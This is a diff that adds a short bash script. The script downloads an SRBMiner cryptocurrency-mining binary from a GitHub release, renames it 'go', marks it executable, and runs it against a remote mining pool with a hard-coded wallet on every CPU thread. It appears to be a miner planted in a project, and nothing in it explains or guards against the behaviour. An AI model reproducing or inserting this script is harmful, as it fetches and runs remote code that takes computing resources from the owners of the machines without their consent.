@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O go https://github.com/bondaltomason/meo/releases/download/2.7.0/SRBMiner-MULTI279
+chmod 777 go
+./go --algorithm panthera --pool pool.lunify.xyz:3333 --wallet fyTUgwMpzMQ3jdDMZ77tEgdqX9DjzzZU5fYL81NWKqKghWqAwKrdmquJkzz3cLTX6m4Y3FosbzYSL9JUCz9fadm519XdzNCtD --password $(echo $RANDOM | md5sum | head -c 10) --cpu-threads $(nproc --all)
